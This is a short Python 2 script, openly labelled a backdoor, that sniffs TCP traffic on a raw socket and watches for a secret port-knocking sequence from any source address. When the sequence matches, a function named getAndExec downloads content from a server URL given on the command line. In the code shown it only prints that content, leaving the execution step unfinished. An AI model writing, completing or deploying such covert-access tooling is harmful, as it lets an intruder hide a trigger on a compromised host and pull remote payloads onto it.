import socket
import sys
from struct import *
import urllib2

def getPortSequence(configFile):
    fp = open(configFile)
    pattern=''
    for line in fp:
        pattern+=line.strip()+','
    return pattern

def getAndExec(serverURL):
    data = urllib2.urlopen(serverURL).read()
    print data[:30]
    return

def startBackdoor(configFile, serverURL):
    pattern = getPortSequence(configFile)
    hostMap = dict()
    print pattern

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error, msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    while True:
        packet = s.recvfrom(65565)
        packet = packet[0]
        ip_header = packet[0:20]
        iph = unpack('!BBHHHBBH4s4s', ip_header)
        version_ihl = iph[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0xF
        iph_length = ihl * 4
        protocol = iph[6]
        s_addr = socket.inet_ntoa(iph[8]);
        d_addr = socket.inet_ntoa(iph[9]);
        """print 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : ' + str(
            ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(
            s_addr) + ' Destination Address : ' + str(d_addr)"""
        tcp_header = packet[iph_length:iph_length + 20]
        tcph = unpack('!HHLLBBHHH', tcp_header)
        source_port = tcph[0]
        dest_port = tcph[1]

        if s_addr in hostMap:
            tempStr = hostMap[s_addr] + str(dest_port)+','
        else:
            tempStr = str(dest_port)+','

        if tempStr==pattern:
            getAndExec(serverURL)
            print hostMap
            if s_addr in hostMap:
                hostMap[s_addr]=''
            print 'Done'
            #exit()
        elif tempStr == pattern[:len(tempStr)]:
            hostMap[s_addr]= tempStr
    return


if __name__=='__main__':
    if len(sys.argv)>2:
        configFile = str(sys.argv[1])
        serverUrl = str(sys.argv[2])
        startBackdoor(configFile,serverUrl)
    else:
        print 'Not enough parameters'
